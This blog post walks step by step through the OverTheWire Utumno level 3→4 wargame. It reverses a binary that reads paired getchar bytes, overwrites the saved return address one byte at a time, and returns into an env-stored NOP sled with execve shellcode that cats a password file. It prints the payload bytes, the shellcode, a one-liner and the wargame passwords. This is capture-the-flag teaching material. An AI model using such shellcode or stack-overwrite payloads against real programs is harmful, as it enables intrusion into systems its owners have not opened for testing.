---
date: 2023-09-11 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Utumno Level 3 → 4 tutorial!!"
permalink: /posts/Over-The-Wire-Utumno-Level-3-to-4/
tags: [overthewire, utumno, pwn, getchar, env, buffer-overwrite, shellcode, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Utumno Level 3 → 4!!"
---

<!-- Scoped styles -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Utumno level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Utumno-Level-2-to-3/' | relative_url }}">← Previous: Level 2 → 3</a>
  </div>
  <div class="nav-center">
    <a href="https://overthewire.org/wargames/utumno/utumno4.html" target="_blank" rel="noopener">Official (Level 4) ↗</a>
  </div>
  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Utumno-Level-4-to-5/' | relative_url }}">Next: Level 4 → 5 →</a>
  </div>
</nav>

## Login

Use the password from **Level 2 → 3**:

```bash
ssh utumno3@utumno.labs.overthewire.org -p 2227
# password: zuudafiine
````

Then head to the game folder:

```bash
cd /utumno
```

---

## Task

Binary: **`/utumno/utumno3`**

* Your **stdin** controls where and what bytes get written on the stack.
* The program uses **two `getchar()` calls per loop iteration**:

  * The **first byte** influences the **target address offset** on the stack.
  * The **second byte** is the **data written** to that computed address.
* Goal: carefully craft 8 input bytes to **overwrite the saved return address** (one byte at a time), then return into a **NOP sled + shellcode** we stash in an environment variable.

---

## Source Code (Disassembly Excerpt)

Core logic around the loop:

```
0x080483eb <+0>:   push ebp
0x080483ec <+1>:   mov  ebp,esp
...
0x08048401 <+22>:  mov  eax,[ebp-0xc]        ; EAX = first getchar() byte
0x08048404 <+25>:  mov  ecx,eax              ; ECX = first byte
0x08048406 <+27>:  lea  edx,[ebp-0x3c]
0x08048409 <+30>:  mov  eax,[ebp-0x8]        ; loop index i
0x0804840c <+33>:  add  eax,edx
0x0804840e <+35>:  mov  byte ptr [eax],cl    ; store first byte into buf[i]

0x08048418 <+45>:  movzx ecx,byte ptr [eax]  ; ECX = buf[i] (first byte)
0x0804841e <+51>:  mov  edx,eax              ; edx = i
0x08048422 <+55>:  add  eax,eax              ; eax = 2*i
0x08048424 <+57>:  add  eax,edx              ; eax = 3*i
0x08048426 <+59>:  xor  ecx,eax              ; ECX ^= 3*i

0x08048440 <+85>:  call getchar@plt          ; read second byte
0x08048445 <+90>:  mov  byte ptr [ebp+ebx*1-0x24],al ; write 2nd byte at EBP + EBX - 0x24

0x08048449 <+94>:  add  dword ptr [ebp-0x8],0x1 ; i++
0x0804844d <+98>:  call getchar@plt             ; read next first byte (or -1 to end)
```

**Takeaways:**

* Each iteration consumes **two input bytes**:

  1. the *selector* (becomes `EBX` after a small transform),
  2. the *payload* (written to `EBP + EBX - 0x24`).
* The transform is `EBX = (first_byte ^ (3*i))` at iteration **i = 0..3**.
* We’ll run **4 iterations** → **8 total input bytes** to patch each byte of the saved **RET**.

---

## Exploitation Steps

### 1) Find EBP & RET on entry

In `gdb` at `main`:

```
(gdb) x/8x $ebp
0xffffd688: 0x00000000 0xf7e2a286 0x00000001 0xffffd724 ...
              ^ EBP     ^ saved RET
```

So the **saved return address** lives at **`[EBP+4]`**; its last byte is at **`EBP+4`** (here `0xffffd68c`).

### 2) Derive the selector value for iteration 0

We want iteration **i=0** to hit `EBP+4` (RET’s LSB). At main+90, destination is:

```
dest = EBP + EBX - 0x24
```

For **i=0**, the transform is `EBX = first_byte ^ (3*0) = first_byte`.

Solve `EBP + EBX - 0x24 = EBP + 4` → `EBX = 0x28`.

**Check in gdb**:

```
(gdb) break *main+94
(gdb) run <<< $(python -c "print '\x28\x41'")
(gdb) x/8wx $ebp
0xffffd688: 0x00000000 0xf7e2a241 ...
```

We overwrote `RET`’s last byte with `0x41`. Success for the first pair.

### 3) Account for XOR(3\*i) on later iterations

Per iteration `i`, the “selector” becomes `EBX = first_byte ^ (3*i)`.
That means the required **input first byte** differs each round:

* i=0 → XOR 0
* i=1 → XOR 3
* i=2 → XOR 6
* i=3 → XOR 9

You repeat the address math for **`EBP+5`, `EBP+6`, `EBP+7`**, adjusting for the XOR.

### 4) Final 8-byte payload (from the run)

```
"\x28\x41\x2a\x42\x2c\x43\x22\x44"
```

Running with it:

```
$ gdb -q ./utumno3
(gdb) run <<< $(python -c "print '\x28\x41\x2a\x42\x2c\x43\x22\x44'")
Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
```

That shows control over RET (now `0x44434241`); next we’ll return into our shellcode.

### 5) Prepare env-based shellcode + sled

We’ll read the next password file by executing `/bin/cat /tmp/axc`, where `/tmp/axc` is a **symlink** to `/etc/utumno_pass/utumno4`.

```bash
export EGG=$(python - <<'PY'
print "\x90"*500 + (
  "\x31\xc0\x99\xb0\x0b"              # xor-eax/eax; cdq; mov al,0xb
  "\x52"                              # push edx
  "\x68\x2f\x63\x61\x74"              # push "//cat"
  "\x68\x2f\x62\x69\x6e"              # push "/bin"
  "\x89\xe3"                          # mov ebx,esp
  "\x52"                              # push edx
  "\x68\x2f\x61\x78\x63"              # push "/axc"
  "\x68\x2f\x74\x6d\x70"              # push "/tmp"
  "\x89\xe1"                          # mov ecx,esp
  "\x52"                              # push edx
  "\x89\xe2"                          # mov edx,esp
  "\x51\x53\x89\xe1"                  # push ecx; push ebx; mov ecx,esp
  "\xcd\x80"                          # int 0x80 (execve)
)
PY)
ln -s /etc/utumno_pass/utumno4 /tmp/axc
```

### 6) Find a return address into the sled

In one run, the sled appeared near **`0xffffdc9c`**:

```
(gdb) x/200x $esp
...
0xffffdc9c: 0x90909090 0x90909090 ...
```

So we’ll set RET to `0xffffdc9c` (little-endian bytes `\x9c\xdc\xff\xff`), byte-by-byte using the 8-byte input.

### 7) Win

```bash
python -c "print '\x28\x9c\x2a\xdc\x2c\xff\x22\xff'" | /utumno/utumno3
oogieleoga
```

The program prints the password (via our `cat` shellcode). 🎯

---

## Password

From my run:

```
oogieleoga
```

---

## Quick One-liner

```bash
export EGG=$(python - <<'PY'
print "\x90"*500 + "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x61\x78\x63\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"
PY)
ln -sf /etc/utumno_pass/utumno4 /tmp/axc
python -c "print '\x28\x9c\x2a\xdc\x2c\xff\x22\xff'" | /utumno/utumno3
```

---

## Troubleshooting

* **Can’t hit the right byte?** Recompute the selector for each iteration using `first_byte = desired_EBX ^ (3*i)`, then ensure `EBP + EBX - 0x24` equals the exact target (`EBP+4+i`).
* **RET shows garbage / wrong endianness?** You’re writing bytes **LSB → MSB**. Confirm target addresses and write order in `gdb`.
* **No sled visible?** Increase NOP count in `EGG` and re-scan the stack (`x/1200x $esp-1200`).
* **Shellcode path mismatch?** Ensure the **symlink** `/tmp/axc` exists and points to `/etc/utumno_pass/utumno4`.

---

**Congrats 🎉** You precisely **byte-patched RET via dual `getchar()` logic** and returned into an **env-based shellcode**—a beautiful demonstration of stack games and address math!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
